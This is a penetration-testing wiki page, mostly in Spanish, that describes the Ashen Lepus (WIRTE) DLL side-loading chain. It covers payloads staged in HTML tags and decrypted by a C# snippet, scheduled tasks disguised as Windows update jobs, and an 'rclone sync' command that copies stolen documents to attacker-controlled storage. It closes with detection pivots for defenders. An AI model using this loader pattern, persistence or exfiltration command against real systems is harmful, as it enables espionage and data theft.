# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) aprovechó un patrón reproducible que encadena DLL sideloading, staged HTML payloads, y backdoors modulares de .NET para persistir dentro de redes diplomáticas de Oriente Medio. La técnica es reutilizable por cualquier operador porque se basa en:

- **Archive-based social engineering**: PDFs benignos instruyen a las víctimas a descargar un archivo RAR desde un sitio de intercambio de archivos. El archivo incluye un visor de documentos EXE con apariencia legítima, un DLL malicioso nombrado como una librería confiable (p. ej., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), y un `Document.pdf` señuelo.
- **DLL search order abuse**: la víctima hace doble clic en el EXE, Windows resuelve la importación del DLL desde el directorio actual, y el cargador malicioso (AshenLoader) se ejecuta dentro del proceso confiable mientras el PDF señuelo se abre para evitar sospechas.
- **Living-off-the-land staging**: cada etapa posterior (AshenStager → AshenOrchestrator → módulos) se mantiene fuera del disco hasta que se necesita, entregada como blobs cifrados ocultos dentro de respuestas HTML por lo demás inocuas.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: el EXE side-loads AshenLoader, que realiza reconocimiento del host, lo cifra con AES-CTR y lo POSTea dentro de parámetros rotativos como `token=`, `id=`, `q=` o `auth=` hacia rutas con apariencia de API (p. ej., `/api/v2/account`).
2. **HTML extraction**: el C2 solo revela la siguiente etapa cuando la IP del cliente se geolocaliza en la región objetivo y el `User-Agent` coincide con el implant, frustrando a los sandboxes. Cuando las comprobaciones pasan, el cuerpo HTTP contiene un `<headerp>...</headerp>` blob con la carga AshenStager cifrada en Base64/AES-CTR.
3. **Second sideload**: AshenStager se despliega con otro binario legítimo que importa `wtsapi32.dll`. La copia maliciosa inyectada en el binario recupera más HTML, esta vez extrayendo `<article>...</article>` para recuperar AshenOrchestrator.
4. **AshenOrchestrator**: un controlador modular .NET que decodifica una config JSON en Base64. Los campos `tg` y `au` de la config se concatenan/hashean para formar la clave AES, que descifra `xrk`. Los bytes resultantes actúan como clave XOR para cada blob de módulo recuperado posteriormente.
5. **Module delivery**: cada módulo se describe mediante comentarios HTML que redirigen al parser a una etiqueta arbitraria, rompiendo reglas estáticas que solo buscan `<headerp>` o `<article>`. Los módulos incluyen persistencia (`PR*`), desinstaladores (`UN*`), reconocimiento (`SN`), captura de pantalla (`SCT`) y exploración de archivos (`FE`).

### Patrón de análisis del contenedor HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Incluso si los defensores bloquean o eliminan un elemento específico, el operador solo necesita cambiar la etiqueta indicada en el comentario HTML para reanudar la entrega.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: los loaders actuales incrustan claves de 256 bits más nonces (por ejemplo, `{9a 20 51 98 ...}`) y opcionalmente añaden una capa XOR usando cadenas como `msasn1.dll` antes/después del descifrado.
- **Recon smuggling**: los datos enumerados ahora incluyen listados de Program Files para detectar aplicaciones de alto valor y siempre se cifran antes de salir del host.
- **URI churn**: los parámetros de consulta y las rutas REST rotan entre campañas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecciones frágiles.
- **Gated delivery**: los servidores están geo-restringidos y solo responden a implants reales. Los clientes no aprobados reciben HTML no sospechoso.

## Persistence & Execution Loop

AshenStager deja tareas programadas que se hacen pasar por trabajos de mantenimiento de Windows y se ejecutan vía `svchost.exe`, p.ej.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Estas tareas relanzan la cadena de sideloading al arrancar o en intervalos, asegurando que AshenOrchestrator pueda solicitar módulos nuevos sin tocar el disco nuevamente.

## Using Benign Sync Clients for Exfiltration

Los operadores colocan documentos diplomáticos en `C:\Users\Public` (legible por todos y no sospechoso) mediante un módulo dedicado, y luego descargan el binario legítimo de [Rclone](https://rclone.org/) para sincronizar ese directorio con el almacenamiento controlado por el atacante:

1. **Stage**: copiar/recopilar los archivos objetivo en `C:\Users\Public\{campaign}\`.
2. **Configure**: entregar una Rclone config apuntando a un endpoint HTTPS controlado por el atacante (p. ej., `api.technology-system[.]com`).
3. **Sync**: ejecutar `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que el tráfico se asemeje a backups en la nube normales.

Dado que Rclone se usa ampliamente en flujos de trabajo legítimos de backup, los defensores deben centrarse en ejecuciones anómalas (binaries nuevos, remotes extraños o sincronizaciones repentinas de `C:\Users\Public`).

## Detection Pivots

- Alertar sobre **signed processes** que inesperadamente cargan DLLs desde rutas escribibles por usuarios (filtros de Procmon + `Get-ProcessMitigation -Module`), especialmente cuando los nombres de DLL se solapan con `netutils`, `srvcli`, `dwampi` o `wtsapi32`.
- Inspeccionar respuestas HTTPS sospechosas en busca de **grandes blobs Base64 incrustados dentro de etiquetas inusuales** o protegidos por comentarios `<!-- TAG: <xyz> -->`.
- Buscar **scheduled tasks** que ejecuten `svchost.exe` con argumentos no propios de un servicio o que apunten de vuelta a directorios del dropper.
- Monitorizar la aparición de binarios **Rclone** fuera de ubicaciones gestionadas por IT, nuevos archivos `rclone.conf` o jobs de sync que tiran de directorios de staging como `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
